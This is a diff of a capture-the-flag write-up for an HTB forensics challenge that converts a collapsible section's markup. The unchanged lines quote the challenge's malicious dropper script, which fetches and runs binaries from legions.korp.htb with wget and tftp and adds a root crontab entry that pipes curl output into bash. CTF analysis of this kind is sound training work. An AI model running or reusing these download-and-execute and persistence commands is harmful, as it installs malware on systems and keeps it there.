@@ -13,10 +13,8 @@ The Fray is upon us, and the very first challenge has been released! Are you rea
 
 ### Solution
 
-<details>
 
-<summary>script.sh</summary>
-
+::: details script.sh
 ```bash
 #!/bin/sh
 
@@ -58,8 +56,7 @@ cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; tftp legio
 cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH;
 echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c 'NG5kX3kwdVJfR3IwdU5kISF9' " >> /etc/crontab
 ```
-
-</details>
+:::
 
 The flag is hidden in given file:
 
